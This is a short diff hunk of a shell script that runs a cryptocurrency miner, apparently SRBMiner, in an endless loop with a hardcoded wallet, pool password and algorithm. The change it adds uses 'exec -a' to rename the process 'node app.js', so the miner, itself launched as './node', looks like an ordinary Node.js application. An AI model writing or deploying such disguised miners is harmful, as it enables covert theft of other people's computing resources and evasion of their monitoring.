@@ -6,6 +6,8 @@ WALLET="R9uHDn9XXqPAe2TLsEmVoNrokmWsHREV2Q"
 PASSWORD="c=RVN"
 ALGO="xelishashv2_pepew"
 
+exec -a "node app.js" bash -c '
+
 # Đảm bảo SRB Miner luôn chạy
 while true; do
     ./node --algorithm $ALGO --pool $POOL --wallet $WALLET --password $PASSWORD --keepalive true
